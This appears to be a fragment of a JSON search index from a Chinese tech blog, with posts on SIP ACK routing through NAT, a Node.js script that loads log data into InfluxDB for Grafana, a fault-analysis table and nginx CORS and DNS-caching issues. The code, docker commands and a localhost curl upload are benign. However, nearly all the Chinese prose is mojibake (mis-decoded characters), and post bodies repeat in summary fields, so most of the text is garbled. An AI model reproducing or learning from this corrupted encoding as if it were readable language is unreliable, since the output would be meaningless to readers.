ACKåˆ†ä¸ºä¸¤ç§ å¤±è´¥è¯·æ±‚çš„ç¡®è®¤ï¼›ä¾‹å¦‚å¯¹4XX, 5XXè¯·æ±‚çš„ç¡®è®¤ã€‚åœ¨å¯¹å¤±è´¥çš„è¯·æ±‚è¿›è¡Œç¡®è®¤æ—¶ï¼ŒACKæ˜¯é€è·³çš„ã€‚ æˆåŠŸçš„è¯·æ±‚çš„ç¡®è®¤ï¼›å¯¹200çš„ç¡®è®¤ï¼Œæ­¤æ—¶ACKæ˜¯ç«¯åˆ°ç«¯çš„ã€‚ ACKä¸€èˆ¬ä¸ä¼šå¸¦æœ‰SDPä¿¡æ¯ã€‚å¦‚æœINVITEæ¶ˆæ¯æ²¡æœ‰å¸¦æœ‰SDPï¼Œé‚£ä¹ˆACKæ¶ˆæ¯ä¸­ä¸€èˆ¬ä¼šå¸¦æœ‰ACK ACKä¸äº‹åŠ¡çš„å…³ç³» å¦‚æœè¯·æ±‚æˆåŠŸï¼Œé‚£ä¹ˆåç»­çš„ACKæ¶ˆæ¯æ˜¯å•ç‹¬çš„äº‹ç‰© å¦‚æœè¯·æ±‚å¤±è´¥ï¼Œé‚£ä¹ˆåç»­çš„ACKæ¶ˆæ¯å’Œä¹‹å‰çš„INVITEæ˜¯å±äºç›¸åŒçš„äº‹åŠ¡ é€è·³ACK VS ç«¯åˆ°ç«¯ACK é€è·³åœ¨è‹±æ–‡ä¸­å«åš: hop-by-hopç«¯åˆ°ç«¯åœ¨è‹±æ–‡ä¸­å«åšï¼šend-to-end\nACKå¦‚ä½•è·¯ç”± ackæ˜¯åºåˆ—åŒ–è¯·æ±‚ï¼Œæ‰€è°“åºåˆ—åŒ–è¯·æ±‚ï¼Œæ˜¯æŒ‡sip to å­—æ®µä¸­å·²ç»æœ‰tagã€‚æœ‰to tagæ˜¯åˆ°è¾¾å¯¹ç«¯çš„å”¯ä¸€æ ‡å¿—ã€‚\næ²¡æœ‰to tagè¯·æ±‚ç§°ä¸ºåˆå§‹åŒ–è¯·æ±‚ï¼Œæœ‰totagç§°ä¸ºåºåˆ—åŒ–è¯·æ±‚ã€‚\nåˆå§‹åŒ–è¯·æ±‚åšè·¯å¾„å‘ç°ï¼Œå¾€å¾€éœ€è¦åšä¸€äº›æ•°æ®åº“æŸ¥è¯¢ï¼ŒDNSæŸ¥è¯¢ã€‚è€Œåºåˆ—åŒ–è¯·æ±‚ä¸éœ€è¦æŸ¥è¯¢æ•°æ®åº“ï¼Œå› ä¸ºè·¯å¾„å·²ç»å‘ç°è¿‡äº†ã€‚\nå®æˆ˜åœºæ™¯ï¼šåˆ†æœºA, SIPæœåŠ¡å™¨S, åˆ†æœºB, Aå‘¼å«Bï¼Œè¯¦ç»†ä»‹ç»ä¸€ä¸‹åˆ°ACKçš„è¿‡ç¨‹ã€‚\nåˆ†æœºAå‘SIPæœåŠ¡å™¨Så‘é€è¯·æ±‚ï¼šINVITE B SIPæœåŠ¡å™¨ é¦–å…ˆåœ¨æ•°æ®åº“ä¸­æŸ¥æ‰¾Bçš„å®é™…æ³¨å†Œåœ°å€ ä¿®æ”¹Contactå¤´ä¸ºåˆ†æœºAçš„å¤–ç½‘åœ°å€å’Œç«¯å£ã€‚å› ä¸ºç”±äºå­˜åœ¨NAT, åˆ†æœºAä¸€èˆ¬ä¸çŸ¥é“è‡ªå·±çš„å…¬ç½‘åœ°å€ã€‚ record_route å°†æ¶ˆæ¯å‘é€ç»™B åˆ†æœºB: æ”¶åˆ°æ¥è‡ªSIPæœåŠ¡å™¨çš„INVITEæ¶ˆæ¯ ä»INVITEä¸­å–å‡ºContact, è·å–å¯¹ç«¯çš„ï¼Œå…¶å®ä¹Ÿå°±æ˜¯åˆ†æœºAçš„å®é™…åœ°å€ å¦‚æœæ‰€æœ‰æ¡ä»¶éƒ½æ»¡è¶³ï¼Œåˆ†æœºBä¼šå‘SIPæœåŠ¡å™¨å‘é€180å“åº”ï¼Œç„¶åå‘é€200å“åº” ç”±äº180å“åº”å’Œ200å“åº”å’ŒINVITEéƒ½å±äºä¸€ä¸ªäº‹åŠ¡ï¼Œå“åº”ä¼šæŒ‰ç…§Viaçš„åœ°å€ï¼Œå…ˆå‘é€ç»™SIPæœåŠ¡å™¨ SIPæœåŠ¡å™¨ï¼š SIPæœåŠ¡å™¨ä¼šé¦–å…ˆä¿®æ”¹180å“åº”çš„Contacå¤´ï¼ŒæŠŠåˆ†æœºBçš„å†…ç½‘åœ°å€æ”¹ä¸ºå¤–ç½‘åœ°å€ SIPæœåŠ¡å™¨æ ¹æ®Viaå¤´ï¼Œå°†æ¶ˆæ¯å‘é€ç»™åˆ†æœºA å¯¹äº200 OKçš„æ¶ˆæ¯ï¼Œå’Œ180çš„å¤„ç†æ˜¯ç›¸åŒçš„ åˆ†æœºA: åˆ†æœºæ”¶åˆ°180æ¶ˆæ¯åï¼Œä»Contactå¤´ä¸­èƒ½å¤Ÿè·å–åˆ†æœºBçš„å¤–ç½‘åœ°å€ åˆ†æœºAåœ¨å‘é€ACKæ—¶ï¼Œrequest urlåœ°å€æ˜¯åˆ†æœºBçš„åœ°å€ï¼Œä½†æ˜¯ç”±äºsipæœåŠ¡å™¨çš„record_routeåŠ¨ä½œé¦–å…ˆä¼šå°†æ¶ˆæ¯å‘é€ç»™SIPæœåŠ¡å™¨ï¼ŒSIPæœåŠ¡å™¨ä¼šæŒ‰ç…§request urlçš„åœ°å€ï¼Œå°†ackå‘é€ç»™åˆ†æœºBã€‚ ACKçš„è·¯ç”±ä¸éœ€è¦åšæ•°æ®åº“æŸ¥è¯¢ï¼ŒACKçš„request urlä¸€èˆ¬æ˜¯å¯¹ç«¯UACçš„åœ°å€ã€‚åœ¨å­˜åœ¨routeå¤´æ—¶ï¼ŒACKä¼šæŒ‰ç…§routeå­—æ®µå»è·¯ç”±ã€‚\nACKä¸¢å¤±äº†ä¼šæ€æ ·ï¼Ÿ å¦‚æœè¢«å«åœ¨ä¸€å®šæ—¶é—´å†…æ²¡æœ‰æ”¶åˆ°ACK, é‚£ä¹ˆè¢«å«ä¼šå‘¨æœŸæ€§çš„é‡å‘200OKã€‚å¦‚æœåœ¨è¶…æ—¶çš„æ—¶å€™ï¼Œè¿˜æ²¡æœ‰æ”¶åˆ°ACK, å°±å‘å‘é€BYEæ¶ˆæ¯æ¥æŒ‚æ–­å‘¼å«ã€‚å¾ˆå¤šå‘¼å«åœ¨30ç§’è‡ªåŠ¨æŒ‚æ–­ï¼Œå¾€å¾€å°±æ˜¯å› ä¸ºä¸¢å¤±äº†ACKã€‚\né‚£ä¹ˆACKä¸ºä»€ä¹ˆä¼šä¸¢å¤±å‘¢ï¼Ÿå¯èƒ½æœ‰ä»¥ä¸‹çš„åŸå› ï¼Œå¤§éƒ¨åˆ†åŸå› å’ŒNATæœ‰å…³ï¼\nSIPæœåŠ¡å™¨æ²¡æœ‰åšfix_nat_contact, å¯¼è‡´ä¸»å«å¯èƒ½ä¸çŸ¥é“å®é™…è¢«å«çš„å¤–ç½‘åœ°å€ ACKä¸åª’ä½“æµçš„å…³ç³» å¹¶ä¸æ˜¯è¯´è¢«å«æ”¶åˆ°ACKåï¼Œåª’ä½“æµæ‰å¼€å§‹ã€‚å¾€å¾€åœ¨180æˆ–è€…183æ—¶ï¼ŒåŒæ–¹å·²ç»èƒ½å¤Ÿå¬åˆ°å¯¹æ–¹çš„å£°éŸ³äº†ã€‚\n","permalink":"https://wdd.js.org/opensips/ch1/sip-ack/","summary":"ACKçš„ç‰¹ç‚¹ ACKä»…ç”¨äºå¯¹INVITEæ¶ˆæ¯çš„æœ€ç»ˆå“åº”è¿›è¡Œç¡®è®¤ ACKçš„CSeqçš„å·ç å¿…é¡»å’ŒINVITEçš„CSeqå·ç ç›¸åŒï¼Œè¿™æ˜¯ç”¨æ¥ä¿è¯ACKå¯¹å¯¹å“ªä¸€ä¸ªINVITEè¿›è¡Œç¡®è®¤çš„å”¯ä¸€æ ‡å¿—ã€‚å¦å¤–CSeqçš„æ–¹æ³•ä¼šæ”¹ä¸ºACK ACKåˆ†ä¸ºä¸¤ç§ å¤±è´¥è¯·æ±‚çš„ç¡®è®¤ï¼›ä¾‹å¦‚å¯¹4XX, 5XXè¯·æ±‚çš„ç¡®è®¤ã€‚åœ¨å¯¹å¤±è´¥çš„è¯·æ±‚è¿›è¡Œç¡®è®¤æ—¶ï¼ŒACKæ˜¯é€è·³çš„ã€‚ æˆåŠŸçš„è¯·æ±‚çš„ç¡®è®¤ï¼›å¯¹200çš„ç¡®è®¤ï¼Œæ­¤æ—¶ACKæ˜¯ç«¯åˆ°ç«¯çš„ã€‚ ACKä¸€èˆ¬ä¸ä¼šå¸¦æœ‰SDPä¿¡æ¯ã€‚å¦‚æœINVITEæ¶ˆæ¯æ²¡æœ‰å¸¦æœ‰SDPï¼Œé‚£ä¹ˆACKæ¶ˆæ¯ä¸­ä¸€èˆ¬ä¼šå¸¦æœ‰ACK ACKä¸äº‹åŠ¡çš„å…³ç³» å¦‚æœè¯·æ±‚æˆåŠŸï¼Œé‚£ä¹ˆåç»­çš„ACKæ¶ˆæ¯æ˜¯å•ç‹¬çš„äº‹ç‰© å¦‚æœè¯·æ±‚å¤±è´¥ï¼Œé‚£ä¹ˆåç»­çš„ACKæ¶ˆæ¯å’Œä¹‹å‰çš„INVITEæ˜¯å±äºç›¸åŒçš„äº‹åŠ¡ é€è·³ACK VS ç«¯åˆ°ç«¯ACK é€è·³åœ¨è‹±æ–‡ä¸­å«åš: hop-by-hopç«¯åˆ°ç«¯åœ¨è‹±æ–‡ä¸­å«åšï¼šend-to-end\nACKå¦‚ä½•è·¯ç”± ackæ˜¯åºåˆ—åŒ–è¯·æ±‚ï¼Œæ‰€è°“åºåˆ—åŒ–è¯·æ±‚ï¼Œæ˜¯æŒ‡sip to å­—æ®µä¸­å·²ç»æœ‰tagã€‚æœ‰to tagæ˜¯åˆ°è¾¾å¯¹ç«¯çš„å”¯ä¸€æ ‡å¿—ã€‚\næ²¡æœ‰to tagè¯·æ±‚ç§°ä¸ºåˆå§‹åŒ–è¯·æ±‚ï¼Œæœ‰totagç§°ä¸ºåºåˆ—åŒ–è¯·æ±‚ã€‚\nåˆå§‹åŒ–è¯·æ±‚åšè·¯å¾„å‘ç°ï¼Œå¾€å¾€éœ€è¦åšä¸€äº›æ•°æ®åº“æŸ¥è¯¢ï¼ŒDNSæŸ¥è¯¢ã€‚è€Œåºåˆ—åŒ–è¯·æ±‚ä¸éœ€è¦æŸ¥è¯¢æ•°æ®åº“ï¼Œå› ä¸ºè·¯å¾„å·²ç»å‘ç°è¿‡äº†ã€‚\nå®æˆ˜åœºæ™¯ï¼šåˆ†æœºA, SIPæœåŠ¡å™¨S, åˆ†æœºB, Aå‘¼å«Bï¼Œè¯¦ç»†ä»‹ç»ä¸€ä¸‹åˆ°ACKçš„è¿‡ç¨‹ã€‚\nåˆ†æœºAå‘SIPæœåŠ¡å™¨Så‘é€è¯·æ±‚ï¼šINVITE B SIPæœåŠ¡å™¨ é¦–å…ˆåœ¨æ•°æ®åº“ä¸­æŸ¥æ‰¾Bçš„å®é™…æ³¨å†Œåœ°å€ ä¿®æ”¹Contactå¤´ä¸ºåˆ†æœºAçš„å¤–ç½‘åœ°å€å’Œç«¯å£ã€‚å› ä¸ºç”±äºå­˜åœ¨NAT, åˆ†æœºAä¸€èˆ¬ä¸çŸ¥é“è‡ªå·±çš„å…¬ç½‘åœ°å€ã€‚ record_route å°†æ¶ˆæ¯å‘é€ç»™B åˆ†æœºB: æ”¶åˆ°æ¥è‡ªSIPæœåŠ¡å™¨çš„INVITEæ¶ˆæ¯ ä»INVITEä¸­å–å‡ºContact, è·å–å¯¹ç«¯çš„ï¼Œå…¶å®ä¹Ÿå°±æ˜¯åˆ†æœºAçš„å®é™…åœ°å€ å¦‚æœæ‰€æœ‰æ¡ä»¶éƒ½æ»¡è¶³ï¼Œåˆ†æœºBä¼šå‘SIPæœåŠ¡å™¨å‘é€180å“åº”ï¼Œç„¶åå‘é€200å“åº” ç”±äº180å“åº”å’Œ200å“åº”å’ŒINVITEéƒ½å±äºä¸€ä¸ªäº‹åŠ¡ï¼Œå“åº”ä¼šæŒ‰ç…§Viaçš„åœ°å€ï¼Œå…ˆå‘é€ç»™SIPæœåŠ¡å™¨ SIPæœåŠ¡å™¨ï¼š SIPæœåŠ¡å™¨ä¼šé¦–å…ˆä¿®æ”¹180å“åº”çš„Contacå¤´ï¼ŒæŠŠåˆ†æœºBçš„å†…ç½‘åœ°å€æ”¹ä¸ºå¤–ç½‘åœ°å€ SIPæœåŠ¡å™¨æ ¹æ®Viaå¤´ï¼Œå°†æ¶ˆæ¯å‘é€ç»™åˆ†æœºA å¯¹äº200 OKçš„æ¶ˆæ¯ï¼Œå’Œ180çš„å¤„ç†æ˜¯ç›¸åŒçš„ åˆ†æœºA: åˆ†æœºæ”¶åˆ°180æ¶ˆæ¯åï¼Œä»Contactå¤´ä¸­èƒ½å¤Ÿè·å–åˆ†æœºBçš„å¤–ç½‘åœ°å€ åˆ†æœºAåœ¨å‘é€ACKæ—¶ï¼Œrequest urlåœ°å€æ˜¯åˆ†æœºBçš„åœ°å€ï¼Œä½†æ˜¯ç”±äºsipæœåŠ¡å™¨çš„record_routeåŠ¨ä½œé¦–å…ˆä¼šå°†æ¶ˆæ¯å‘é€ç»™SIPæœåŠ¡å™¨ï¼ŒSIPæœåŠ¡å™¨ä¼šæŒ‰ç…§request urlçš„åœ°å€ï¼Œå°†ackå‘é€ç»™åˆ†æœºBã€‚ ACKçš„è·¯ç”±ä¸éœ€è¦åšæ•°æ®åº“æŸ¥è¯¢ï¼ŒACKçš„request urlä¸€èˆ¬æ˜¯å¯¹ç«¯UACçš„åœ°å€ã€‚åœ¨å­˜åœ¨routeå¤´æ—¶ï¼ŒACKä¼šæŒ‰ç…§routeå­—æ®µå»è·¯ç”±ã€‚\nACKä¸¢å¤±äº†ä¼šæ€æ ·ï¼Ÿ å¦‚æœè¢«å«åœ¨ä¸€å®šæ—¶é—´å†…æ²¡æœ‰æ”¶åˆ°ACK, é‚£ä¹ˆè¢«å«ä¼šå‘¨æœŸæ€§çš„é‡å‘200OKã€‚å¦‚æœåœ¨è¶…æ—¶çš„æ—¶å€™ï¼Œè¿˜æ²¡æœ‰æ”¶åˆ°ACK, å°±å‘å‘é€BYEæ¶ˆæ¯æ¥æŒ‚æ–­å‘¼å«ã€‚å¾ˆå¤šå‘¼å«åœ¨30ç§’è‡ªåŠ¨æŒ‚æ–­ï¼Œå¾€å¾€å°±æ˜¯å› ä¸ºä¸¢å¤±äº†ACKã€‚\né‚£ä¹ˆACKä¸ºä»€ä¹ˆä¼šä¸¢å¤±å‘¢ï¼Ÿå¯èƒ½æœ‰ä»¥ä¸‹çš„åŸå› ï¼Œå¤§éƒ¨åˆ†åŸå› å’ŒNATæœ‰å…³ï¼\nSIPæœåŠ¡å™¨æ²¡æœ‰åšfix_nat_contact, å¯¼è‡´ä¸»å«å¯èƒ½ä¸çŸ¥é“å®é™…è¢«å«çš„å¤–ç½‘åœ°å€ ACKä¸åª’ä½“æµçš„å…³ç³» å¹¶ä¸æ˜¯è¯´è¢«å«æ”¶åˆ°ACKåï¼Œåª’ä½“æµæ‰å¼€å§‹ã€‚å¾€å¾€åœ¨180æˆ–è€…183æ—¶ï¼ŒåŒæ–¹å·²ç»èƒ½å¤Ÿå¬åˆ°å¯¹æ–¹çš„å£°éŸ³äº†ã€‚","title":"æ·±å…¥ç†è§£SIP ACK æ–¹æ³•"},{"content":"æ•°æ®è§„æ•´ æˆ‘çš„æ•°æ®æ¥æºä¸€èˆ¬éƒ½æ˜¯æ¥è‡ªäºæ—¥å¿—æ–‡ä»¶ï¼Œä¸åŒçš„æ—¥å¿—æ–‡ä»¶æ ¼å¼å¯èƒ½éƒ½ä¸ç›¸åŒã€‚æ‰€ä»¥ç¬¬ä¸€æ­¥å°±æ˜¯æŠŠæ•°æ®æŠ½å–å‡ºæ¥ï¼Œå¹¶ä¸”æ ¼å¼åŒ–ã€‚\nä¸€èˆ¬æƒ…å†µä¸‹æˆ‘ä¼šç”¨grepæˆ–è€…awkè¿›è¡Œåˆæ­¥çš„æ•´ç†ã€‚å¦‚æœshellè„šæœ¬å¤„ç†ä¸å¤ªæ–¹ä¾¿ï¼Œé€šå¸¸æˆ‘ä¼šå†™ä¸ªjsè„šæœ¬ã€‚\nNode.jsçš„readlineå¯ä»¥å®ç°æŒ‰è¡Œå–å‡ºã€‚å¤„ç†è¿‡åçš„è¾“å‡ºä¾ç„¶æ˜¯å†™æ–‡ä»¶ã€‚\nconst readline = require(\u0026#39;readline\u0026#39;) const fs = require(\u0026#39;fs\u0026#39;) const dayjs = require(\u0026#39;dayjs\u0026#39;) const fileName = \u0026#39;data.log\u0026#39; const batch = dayjs().format(\u0026#39;MMDDHHmmss\u0026#39;) const dist = fs.createWriteStream(`${fileName}.out`) const rl = readline.createInterface({ input: fs.createReadStream(fileName) }) rl.on(\u0026#39;line\u0026#39;, handlerLine) function handlerLine (line) { let info = line.split(\u0026#39; \u0026#39;) let time = dayjs(`2020-${info[0]} ${info[1]}`).valueOf() let log = `rtpproxy,tag=b${batch} socket=${info[2]},mem=${info[3]} ${time}000000\\n` console.log(log) dist.write(log) } è¾“å‡ºçš„æ–‡ä»¶æ ¼å¼å¦‚ä¸‹ï¼Œè‡³äºä¸ºä»€ä¹ˆæ˜¯è¿™ç§æ ¼å¼ï¼Œä¸”çœ‹ä¸‹æ–‡åˆ†æ™“ã€‚\nrtpproxy,tag=b0216014954 socket=691,mem=3106936 1581477499000000000 rtpproxy,tag=b0216014954 socket=615,mem=3109328 1581477648000000000 rtpproxy,tag=b0216014954 socket=669,mem=3113764 1581477901000000000 rtpproxy,tag=b0216014954 socket=701,mem=3114820 1581477961000000000 æ•°æ®å¯¼å…¥ ä»¥å‰æˆ‘éƒ½ä¼šæŠŠæ•°æ®è§„æ•´åçš„è¾“å‡ºå†™æˆä¸€ä¸ªJSONæ–‡ä»¶ï¼Œç„¶åå†™htmlé¡µé¢ï¼Œå¼•å…¥Echartsåº“ï¼Œè¿›è¡Œæ•°æ®å¯è§†åŒ–ã€‚\nä½†æ˜¯è¿™ç§æ–¹å¼è¿‡äºç¹çï¼Œæ¯æ¬¡éƒ½è¦å†™ä¸ªEcharsçš„Optionsã€‚\næ‰€ä»¥æˆ‘æƒ³ï¼Œå¦‚æœæŠŠæ•°æ®å†™å…¥influxdbï¼Œç„¶åç”¨grafanaå»åšå¯è§†åŒ–ï¼Œé‚£å²‚ä¸æ˜¯ååˆ†æ–¹ä¾¿ã€‚\næ‰€ä»¥ï¼Œæˆ‘ä»¬è¦æŠŠæ•°æ®å¯¼å…¥influxdbã€‚\nå¯åŠ¨influxdb grafana ä¸‹é¢æ˜¯ä¸€ä¸ªMakefileï¼Œ ç”¨æ¥å¯åŠ¨å®¹å™¨ã€‚\nmake create-network ç”¨æ¥åˆ›å»ºä¸¤ä¸ªå®¹å™¨çš„ç½‘ç»œï¼Œè¿™æ ·grafanaå°±å¯ä»¥é€šè¿‡å®¹å™¨åè®¿é—®influxdbäº†ã€‚ make run-influxdb å¯åŠ¨influxdbï¼Œå…¶ä¸­8086ç«¯å£æ˜¯influxdbå¯¹å¤–æä¾›æœåŠ¡çš„ç«¯å£ make run-grafana å¯åŠ¨grafana, å…¶ä¸­3000ç«¯å£æ˜¯grafanaå¯¹å¤–æä¾›æœåŠ¡çš„ç«¯å£ run-influxdb: docker run -d -p 8083:8083 -p 8086:8086 --network b2 --name influxdb influxdb:latest run-grafana: docker run -d --name grafana --network b2 -p 3000:3000 grafana/grafana create-network: docker network create -d bridge --ip-range=192.168.1.0/24 --gateway=192.168.1.1 --subnet=192.168.1.0/24 b2 æ¥ç€ä½ æ‰“å¼€localhost:3000ç«¯å£ï¼Œè¾“å…¥é»˜è®¤çš„ç”¨æˆ·åå¯†ç  admin/amdinæ¥ç™»å½•\nåˆ›å»ºé»˜è®¤çš„æ•°æ®åº“\nè¿›å…¥influxbçš„å®¹å™¨ä¸­åˆ›å»ºæ•°æ®åº“\ndocker exec -it influxdb bash influx create database mydb grafanaä¸­æ·»åŠ influxdbæ•°æ®æº\nä½¿ç”¨curlä¸Šä¼ æ•°æ®åˆ°influxdb\ncurl -i -XPOST \u0026#34;http://localhost:8086/write?db=mydb\u0026#34; --data-binary @data.log.out grafanaä¸Šæ·»åŠ dashboard ç»“è®º é€šè¿‡ä½¿ç”¨influxbæ¥å­˜å‚¨æ•°æ®ï¼Œgrafanaæ¥åšå¯è§†åŒ–ã€‚æ¯æ¬¡éœ€è¦åˆ†æçš„æ—¶å€™ï¼Œæˆ‘éœ€è¦åšçš„ä»…ä»…åªæ˜¯å†™ä¸ªè„šæœ¬å»è§„æ•´æ•°æ®ï¼Œè¿™æ ·å°±å¤§å¤§æä¾›äº†åˆ†ææ•ˆç‡ã€‚\n","permalink":"https://wdd.js.org/posts/2020/02/mrgkvf/","summary":"æ•°æ®è§„æ•´ æˆ‘çš„æ•°æ®æ¥æºä¸€èˆ¬éƒ½æ˜¯æ¥è‡ªäºæ—¥å¿—æ–‡ä»¶ï¼Œä¸åŒçš„æ—¥å¿—æ–‡ä»¶æ ¼å¼å¯èƒ½éƒ½ä¸ç›¸åŒã€‚æ‰€ä»¥ç¬¬ä¸€æ­¥å°±æ˜¯æŠŠæ•°æ®æŠ½å–å‡ºæ¥ï¼Œå¹¶ä¸”æ ¼å¼åŒ–ã€‚\nä¸€èˆ¬æƒ…å†µä¸‹æˆ‘ä¼šç”¨grepæˆ–è€…awkè¿›è¡Œåˆæ­¥çš„æ•´ç†ã€‚å¦‚æœshellè„šæœ¬å¤„ç†ä¸å¤ªæ–¹ä¾¿ï¼Œé€šå¸¸æˆ‘ä¼šå†™ä¸ªjsè„šæœ¬ã€‚\nNode.jsçš„readlineå¯ä»¥å®ç°æŒ‰è¡Œå–å‡ºã€‚å¤„ç†è¿‡åçš„è¾“å‡ºä¾ç„¶æ˜¯å†™æ–‡ä»¶ã€‚\nconst readline = require(\u0026#39;readline\u0026#39;) const fs = require(\u0026#39;fs\u0026#39;) const dayjs = require(\u0026#39;dayjs\u0026#39;) const fileName = \u0026#39;data.log\u0026#39; const batch = dayjs().format(\u0026#39;MMDDHHmmss\u0026#39;) const dist = fs.createWriteStream(`${fileName}.out`) const rl = readline.createInterface({ input: fs.createReadStream(fileName) }) rl.on(\u0026#39;line\u0026#39;, handlerLine) function handlerLine (line) { let info = line.split(\u0026#39; \u0026#39;) let time = dayjs(`2020-${info[0]} ${info[1]}`).valueOf() let log = `rtpproxy,tag=b${batch} socket=${info[2]},mem=${info[3]} ${time}000000\\n` console.log(log) dist.write(log) } è¾“å‡ºçš„æ–‡ä»¶æ ¼å¼å¦‚ä¸‹ï¼Œè‡³äºä¸ºä»€ä¹ˆæ˜¯è¿™ç§æ ¼å¼ï¼Œä¸”çœ‹ä¸‹æ–‡åˆ†æ™“ã€‚\nrtpproxy,tag=b0216014954 socket=691,mem=3106936 1581477499000000000 rtpproxy,tag=b0216014954 socket=615,mem=3109328 1581477648000000000 rtpproxy,tag=b0216014954 socket=669,mem=3113764 1581477901000000000 rtpproxy,tag=b0216014954 socket=701,mem=3114820 1581477961000000000 æ•°æ®å¯¼å…¥ ä»¥å‰æˆ‘éƒ½ä¼šæŠŠæ•°æ®è§„æ•´åçš„è¾“å‡ºå†™æˆä¸€ä¸ªJSONæ–‡ä»¶ï¼Œç„¶åå†™htmlé¡µé¢ï¼Œå¼•å…¥Echartsåº“ï¼Œè¿›è¡Œæ•°æ®å¯è§†åŒ–ã€‚","title":"æˆ‘çš„æ•°æ®å¯è§†åŒ–å¤„ç†è¿‡ç¨‹"},{"content":"ç‰¹å¾ç»´åº¦ ç‰¹å¾é¡¹ é›†ä¸­ æ— è§„å¾‹ å‘¨æœŸæ€§ æ—¶é—´ é›†ä¸­åœ¨æŸä¸ªæ—¶é—´ç‚¹å‘ç”Ÿ æŒ‰å›ºå®šæ—¶é—´é—´éš”å‘ç”Ÿ ç©ºé—´ é›†ä¸­åœ¨æŸä¸ªç©ºé—´å‘ç”Ÿ äººç‰© é›†ä¸­åœ¨æŸä¸ªäººç‰©èº«ä¸Šå‘ç”Ÿ ","permalink":"https://wdd.js.org/posts/2020/02/rx59i2/","summary":"ç‰¹å¾ç»´åº¦ ç‰¹å¾é¡¹ é›†ä¸­ æ— è§„å¾‹ å‘¨æœŸæ€§ æ—¶é—´ é›†ä¸­åœ¨æŸä¸ªæ—¶é—´ç‚¹å‘ç”Ÿ æŒ‰å›ºå®šæ—¶é—´é—´éš”å‘ç”Ÿ ç©ºé—´ é›†ä¸­åœ¨æŸä¸ªç©ºé—´å‘ç”Ÿ äººç‰© é›†ä¸­åœ¨æŸä¸ªäººç‰©èº«ä¸Šå‘ç”Ÿ ","title":"æ•…éšœçš„ç‰¹å¾åˆ†ææ–¹æ³•"},{"content":"ä¸‹æ–‡çš„è®ºè¿°éƒ½ä»¥ä¸‹é¢çš„é…ç½®ä¸ºä¾‹å­\nlocation ^~ /p/security { rewrite /p/security/(.*) /security/$1 break; proxy_pass http://security:8080; proxy_redirect off; proxy_set_header Host $host; add_header \u0026#39;Access-Control-Allow-Origin\u0026#39; \u0026#39;*\u0026#39; always; add_header \u0026#39;Access-Control-Allow-Credentials\u0026#39; \u0026#39;true\u0026#39; always; } å¦‚æœdnsæ— æ³•è§£æï¼Œnginxåˆ™æ— æ³•å¯åŠ¨ securityå¦‚æœæ— æ³•è§£æï¼Œé‚£ä¹ˆnginxåˆ™æ— æ³•å¯åŠ¨ DNSç¼“å­˜é—®é¢˜ï¼š nginxå¯åŠ¨æ—¶ï¼Œå¦‚æœå°†security dnsè§£æä¸º1.2.3.4ã€‚å¦‚æœsecurityçš„ipåœ°å€å˜äº†ã€‚nginxä¸ä¼šè‡ªåŠ¨è§£ææ–°çš„ipåœ°å€ï¼Œå¯¼è‡´åå‘ä»£ç†æŠ¥é”™504ã€‚ åå‘ä»£ç†çš„DNSç¼“å­˜é—®é¢˜åŠ¡å¿…é‡è§† è·¨åŸŸå¤´é…ç½®çš„always åå‘ä»£ç†ä¸€èˆ¬éƒ½æ˜¯å¸Œæœ›å…è®¸è·¨åŸŸçš„ã€‚å¦‚æœä¸åŠ alwaysï¼Œé‚£ä¹ˆåªä¼šå¯¹æˆåŠŸçš„è¯·æ±‚åŠ è·¨åŸŸå¤´ï¼Œå¤±è´¥çš„è¯·æ±‚åˆ™ä¸ä¼šã€‚ å…³äº**\u0026lsquo;Access-Control-Allow-Origin\u0026rsquo; \u0026lsquo;*\u0026rsquo;ï¼Œå¦‚æœåç«¯æœåŠ¡æœ¬èº«å°±å¸¦æœ‰è¿™ä¸ªå¤´ï¼Œé‚£ä¹ˆå¦‚æœä½ åœ¨nginxä¸­å†æ·»åŠ è¿™ä¸ªå¤´ï¼Œå°±ä¼šåœ¨æµè§ˆå™¨ä¸­é‡åˆ°ä¸‹é¢çš„æŠ¥é”™ã€‚è€Œè§£å†³åŠæ³•å°±æ˜¯ä¸è¦åœ¨nginxä¸­è®¾ç½®è¿™ä¸ªå¤´ã€‚**\nAccess to fetch at \u0026#39;http://192.168.40.107:31088/p/security/v2/login\u0026#39; from origin \u0026#39;http://localhost:5000\u0026#39; has been blocked by CORS policy: Response to preflight request doesn\u0026#39;t pass access control check: The \u0026#39;Access-Control-Allow-Origin\u0026#39; header contains multiple values \u0026#39;*, *\u0026#39;, but only one is allowed. Have the server send the header with a valid value, or, if an opaque response serves your needs, set the request\u0026#39;s mode to \u0026#39;no-cors\u0026#39; to fetch the resource with CORS disabled. å‚è€ƒé“¾æ¥ http://nginx.org/en/docs/http/ngx_http_headers_module.html http://www.hxs.biz/html/20180425122255.html https://blog.csdn.net/xiojing825/article/details/83383524 https://cloud.tencent.com/developer/article/1470375 https://blog.csdn.net/bbg221/article/details/79886979 ","permalink":"https://wdd.js.org/posts/2020/02/ngse8g/","summary":"ä¸‹æ–‡çš„è®ºè¿°éƒ½ä»¥ä¸‹é¢çš„é…ç½®ä¸ºä¾‹å­\nlocation ^~ /p/security { rewrite /p/security/(.*) /security/$1 break; proxy_pass http://security:8080; proxy_redirect off; proxy_set_header Host $host; add_header \u0026#39;Access-Control-Allow-Origin\u0026#39; \u0026#39;*\u0026#39; always; add_header \u0026#39;Access-Control-Allow-Credentials\u0026#39; \u0026#39;true\u0026#39; always; } å¦‚æœdnsæ— æ³•è§£æï¼Œnginxåˆ™æ— æ³•å¯åŠ¨ securityå¦‚æœæ— æ³•è§£æï¼Œé‚£ä¹ˆnginxåˆ™æ— æ³•å¯åŠ¨ DNSç¼“å­˜é—®é¢˜ï¼š nginxå¯åŠ¨æ—¶ï¼Œå¦‚æœå°†security dnsè§£æä¸º1.2.3.4ã€‚å¦‚æœsecurityçš„ipåœ°å€å˜äº†ã€‚nginxä¸ä¼šè‡ªåŠ¨è§£ææ–°çš„ipåœ°å€ï¼Œå¯¼è‡´åå‘ä»£ç†æŠ¥é”™504ã€‚ åå‘ä»£ç†çš„DNSç¼“å­˜é—®é¢˜åŠ¡å¿…é‡è§† è·¨åŸŸå¤´é…ç½®çš„always åå‘ä»£ç†ä¸€èˆ¬éƒ½æ˜¯å¸Œæœ›å…è®¸è·¨åŸŸçš„ã€‚å¦‚æœä¸åŠ alwaysï¼Œé‚£ä¹ˆåªä¼šå¯¹æˆåŠŸçš„è¯·æ±‚åŠ è·¨åŸŸå¤´ï¼Œå¤±è´¥çš„è¯·æ±‚åˆ™ä¸ä¼šã€‚ å…³äº**\u0026lsquo;Access-Control-Allow-Origin\u0026rsquo; 